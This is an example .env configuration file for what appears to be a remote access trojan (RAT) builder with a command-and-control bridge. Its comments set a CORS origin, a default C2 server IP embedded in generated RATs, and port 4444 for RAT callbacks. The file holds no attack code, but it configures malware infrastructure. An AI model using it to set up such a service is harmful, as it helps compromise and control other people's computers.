# Bridge configuration — copy to .env and fill in your values

# CORS: the URL where your frontend is hosted (used by browser security)
# Local dev: http://localhost:3000
# Production: https://yourdomain.com
ALLOWED_ORIGIN=http://localhost:3000

# Default C2 server IP embedded in generated RATs (your VPS public IP)
# This is used as fallback if the UI doesn't supply one
C2_HOST=YOUR_VPS_IP_HERE

# Default C2 TCP port for RAT callbacks
C2_PORT=4444
